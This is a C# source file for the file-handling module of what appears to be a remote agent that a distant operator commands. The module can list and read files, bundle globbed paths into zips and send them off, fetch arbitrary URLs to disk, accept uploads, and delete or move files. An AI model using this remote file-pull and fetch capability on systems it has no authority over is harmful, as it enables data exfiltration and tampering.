using System.IO.Compression;
using System.Net.Http;
using System.Text;
using System.Text.Json.Nodes;

namespace WRAgent
{
    internal static class FileModule
    {
        private static readonly Dictionary<string, FileStream> Uploads = new();
        private const int MaxList = 5000;

        private static readonly HttpClient Http = new HttpClient
        {
            Timeout = TimeSpan.FromMinutes(10)
        };

        // -----------------------------------------------------------------
        public static JsonObject Ls(JsonObject args)
        {
            var path = Util.Str(args, "path", ".");
            try
            {
                path = Path.GetFullPath(Environment.ExpandEnvironmentVariables(path));
                if (File.Exists(path))
                {
                    var fi = new FileInfo(path);
                    return new JsonObject
                    {
                        ["ok"] = true,
                        ["stdout"] = $"{fi.Name}  {fi.Length} bytes  {fi.LastWriteTime}",
                        ["meta"] = new JsonObject
                        {
                            ["path"] = fi.FullName,
                            ["entries"] = new JsonArray(new JsonObject
                            {
                                ["name"] = fi.Name, ["path"] = fi.FullName,
                                ["dir"] = false, ["size"] = fi.Length,
                                ["hidden"] = false,
                                ["mtime"] = fi.LastWriteTimeUtc.ToString("o")
                            })
                        }
                    };
                }
                if (!Directory.Exists(path))
                    return new JsonObject { ["ok"] = false, ["error"] = "not found: " + path };

                var di = new DirectoryInfo(path);
                var arr = new JsonArray();
                var sb = new StringBuilder();
                sb.AppendLine($" {di.FullName}");
                sb.AppendLine(new string('-', 78));

                var count = 0;
                foreach (var entry in di.EnumerateFileSystemInfos())
                {
                    if (count++ >= MaxList) break;
                    bool isDir;
                    long size = 0;
                    DateTime mtime;
                    bool hidden;
                    try
                    {
                        isDir = (entry.Attributes & FileAttributes.Directory) != 0;
                        hidden = (entry.Attributes & FileAttributes.Hidden) != 0;
                        if (!isDir && entry is FileInfo f) size = f.Length;
                        mtime = entry.LastWriteTime;
                    }
                    catch { continue; }

                    arr.Add(new JsonObject
                    {
                        ["name"] = entry.Name,
                        ["path"] = entry.FullName,
                        ["dir"] = isDir,
                        ["size"] = size,
                        ["hidden"] = hidden,
                        ["mtime"] = mtime.ToUniversalTime().ToString("o")
                    });

                    var label = isDir ? entry.Name + "\\" : entry.Name;
                    if (label.Length > 46) label = label.Substring(0, 45) + "…";
                    sb.AppendLine($" {label,-48} {(isDir ? "<dir>" : size.ToString()),12}  {mtime:yyyy-MM-dd HH:mm}");
                }

                return new JsonObject
                {
                    ["ok"] = true,
                    ["stdout"] = sb.ToString().TrimEnd(),
                    ["meta"] = new JsonObject { ["path"] = di.FullName, ["entries"] = arr }
                };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        // -----------------------------------------------------------------
        public static JsonObject Cat(JsonObject args)
        {
            var path = Util.Str(args, "path");
            var max = Util.Int(args, "max", 256 * 1024);
            try
            {
                using var fs = File.OpenRead(path);
                var len = (int)Math.Min(fs.Length, max);
                var buf = new byte[len];
                var read = fs.Read(buf, 0, len);
                var text = Encoding.UTF8.GetString(buf, 0, read);
                return new JsonObject
                {
                    ["ok"] = true,
                    ["stdout"] = text,
                    ["meta"] = new JsonObject { ["path"] = path, ["bytes"] = read, ["truncated"] = fs.Length > len }
                };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        // -----------------------------------------------------------------
        /// <summary>
        /// Pulls whatever the operator asked for: one path, a list of paths,
        /// globs, folders — packs multiple hits into a single zip.
        /// </summary>
        public static async Task<JsonObject> Download(JsonObject args, Transport t)
        {
            var spec = Util.Str(args, "path");
            if (spec.Length == 0) return new JsonObject { ["ok"] = false, ["error"] = "path required" };

            try
            {
                var items = Resolve(spec);
                if (items.Count == 0)
                    return new JsonObject { ["ok"] = false, ["error"] = "nothing matched: " + spec };

                var single = items.Count == 1 ? items[0] : null;
                byte[] bytes;
                string name;

                if (single != null && File.Exists(single))
                {
                    bytes = await File.ReadAllBytesAsync(single).ConfigureAwait(false);
                    name = Path.GetFileName(single);
                }
                else if (single != null && Directory.Exists(single))
                {
                    bytes = await ZipPath(single, Path.GetFileName(single.TrimEnd('\\')) + ".zip").ConfigureAwait(false);
                    name = Path.GetFileName(single.TrimEnd('\\')) + ".zip";
                }
                else
                {
                    var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".zip");
                    using (var zip = ZipFile.Open(tmp, ZipArchiveMode.Create))
                    {
                        foreach (var item in items)
                        {
                            if (Directory.Exists(item))
                            {
                                var root = Path.GetFileName(item.TrimEnd('\\'));
                                foreach (var f in Directory.EnumerateFiles(item, "*",
                                             SearchOption.AllDirectories))
                                {
                                    if (!IsReadable(f)) continue;
                                    var rel = Path.Combine(root, Path.GetRelativePath(item, f));
                                    try { zip.CreateEntryFromFile(f, rel, CompressionLevel.Fastest); } catch { }
                                }
                            }
                            else if (File.Exists(item) && IsReadable(item))
                            {
                                try { zip.CreateEntryFromFile(item, Path.GetFileName(item), CompressionLevel.Fastest); } catch { }
                            }
                        }
                    }
                    bytes = await File.ReadAllBytesAsync(tmp).ConfigureAwait(false);
                    try { File.Delete(tmp); } catch { }
                    name = $"bundle-{DateTime.Now:HHmmss}.zip";
                }

                var meta = new JsonObject { ["name"] = name, ["path"] = spec };
                await t.EmitBlobAsync("file", meta, bytes).ConfigureAwait(false);

                return new JsonObject
                {
                    ["ok"] = true,
                    ["stdout"] = $"queued {name} ({bytes.Length / 1024} KB)",
                    ["meta"] = new JsonObject { ["files"] = items.Count, ["bytes"] = bytes.Length }
                };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        public static async Task<JsonObject> Wget(JsonObject args, Transport t)
        {
            var url = Util.Str(args, "url");
            if (url.Length == 0) return new JsonObject { ["ok"] = false, ["error"] = "url required" };

            var tid = Util.Str(args, "tid", "");
            var path = Util.Str(args, "path");
            try
            {
                if (path.Length == 0)
                {
                    var leaf = Path.GetFileName(new Uri(url).AbsolutePath);
                    if (string.IsNullOrWhiteSpace(leaf)) leaf = "download.bin";
                    path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                        "Downloads", leaf);
                }

                var dir = Path.GetDirectoryName(path);
                if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);

                using var res = await Http.GetAsync(url, HttpCompletionOption.ResponseHeadersRead)
                                          .ConfigureAwait(false);
                res.EnsureSuccessStatusCode();

                var total = res.Content.Headers.ContentLength ?? -1;
                long read = 0;
                var last = -1;

                await using (var src = await res.Content.ReadAsStreamAsync().ConfigureAwait(false))
                await using (var dst = File.Create(path))
                {
                    var buf = new byte[81920];
                    int n;
                    while ((n = await src.ReadAsync(buf).ConfigureAwait(false)) > 0)
                    {
                        await dst.WriteAsync(buf.AsMemory(0, n)).ConfigureAwait(false);
                        read += n;
                        if (total > 0 && tid.Length > 0)
                        {
                            var pct = (int)(read * 100 / total);
                            if (pct >= last + 5) { last = pct; await t.EmitProgress(tid, pct); }
                        }
                    }
                }

                return new JsonObject
                {
                    ["ok"] = true,
                    ["stdout"] = $"saved {path} ({read / 1024} KB)",
                    ["meta"] = new JsonObject { ["path"] = path, ["bytes"] = read }
                };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        // -----------------------------------------------------------------
        public static JsonObject Upload(JsonObject args)
        {
            var tid = Util.Str(args, "tid", "default");
            var path = Util.Str(args, "path");
            var data = Util.Str(args, "data");
            var seq = Util.Int(args, "seq", 0);
            var total = Util.Int(args, "total", 1);

            lock (Uploads)
            {
                try
                {
                    if (!Uploads.TryGetValue(tid, out var fs))
                    {
                        var dir = Path.GetDirectoryName(path);
                        if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
                        fs = new FileStream(path, seq == 0 ? FileMode.Create : FileMode.Append,
                            FileAccess.Write, FileShare.Read);
                        Uploads[tid] = fs;
                    }

                    var bytes = Convert.FromBase64String(data);
                    fs.Write(bytes, 0, bytes.Length);

                    if (seq + 1 >= total)
                    {
                        fs.Flush();
                        fs.Dispose();
                        Uploads.Remove(tid);
                        return new JsonObject
                        {
                            ["ok"] = true,
                            ["stdout"] = $"uploaded {path}",
                            ["meta"] = new JsonObject { ["path"] = path }
                        };
                    }
                    fs.Flush();
                    return new JsonObject { ["ok"] = true };
                }
                catch (Exception e)
                {
                    if (Uploads.Remove(tid, out var bad))
                    {
                        try { bad.Dispose(); } catch { }
                    }
                    return new JsonObject { ["ok"] = false, ["error"] = e.Message };
                }
            }
        }

        // -----------------------------------------------------------------
        public static JsonObject Op(string op, JsonObject args)
        {
            try
            {
                var src = Util.Str(args, "path");
                switch (op)
                {
                    case "rm":
                    {
                        var recursive = Util.Bool(args, "recursive");
                        if (Directory.Exists(src))
                        {
                            Directory.Delete(src, recursive);
                            return new JsonObject { ["ok"] = true, ["stdout"] = "removed dir " + src };
                        }
                        File.Delete(src);
                        return new JsonObject { ["ok"] = true, ["stdout"] = "removed " + src };
                    }
                    case "mkdir":
                        Directory.CreateDirectory(src);
                        return new JsonObject { ["ok"] = true, ["stdout"] = "created " + src };
                    case "mv":
                    case "cp":
                    {
                        var dst = Util.Str(args, "dest");
                        if (Directory.Exists(src))
                        {
                            if (op == "cp") CopyDir(src, dst);
                            else Directory.Move(src, dst);
                        }
                        else
                        {
                            if (op == "cp") File.Copy(src, dst, true);
                            else File.Move(src, dst, true);
                        }
                        return new JsonObject { ["ok"] = true, ["stdout"] = $"{op} {src} -> {dst}" };
                    }
                    default:
                        return new JsonObject { ["ok"] = false, ["error"] = "unknown op" };
                }
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        // -----------------------------------------------------------------
        private static List<string> Resolve(string spec)
        {
            var hits = new List<string>();
            foreach (var raw in spec.Split(new[] { '\n', ';' }, StringSplitOptions.RemoveEmptyEntries))
            {
                var part = Environment.ExpandEnvironmentVariables(raw.Trim().Trim('"'));
                if (part.Length == 0) continue;
                if (File.Exists(part) || Directory.Exists(part)) { hits.Add(part); continue; }

                try
                {
                    var dir = Path.GetDirectoryName(part);
                    var pattern = Path.GetFileName(part);
                    if (!string.IsNullOrEmpty(dir) && Directory.Exists(dir) &&
                        !string.IsNullOrEmpty(pattern) && pattern.Contains('*'))
                    {
                        hits.AddRange(Directory.GetFiles(dir, pattern));
                        hits.AddRange(Directory.GetDirectories(dir, pattern));
                    }
                }
                catch { }
            }
            return hits.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
        }

        private static bool IsReadable(string path)
        {
            try
            {
                using var _ = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                return true;
            }
            catch { return false; }
        }

        private static async Task<byte[]> ZipPath(string dir, string name)
        {
            var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".zip");
            ZipFile.CreateFromDirectory(dir, tmp, CompressionLevel.Fastest, false);
            var bytes = await File.ReadAllBytesAsync(tmp).ConfigureAwait(false);
            try { File.Delete(tmp); } catch { }
            return bytes;
        }

        private static void CopyDir(string src, string dst)
        {
            Directory.CreateDirectory(dst);
            foreach (var file in Directory.GetFiles(src))
                File.Copy(file, Path.Combine(dst, Path.GetFileName(file)), true);
            foreach (var dir in Directory.GetDirectories(src))
                CopyDir(dir, Path.Combine(dst, Path.GetFileName(dir)));
        }
    }
}
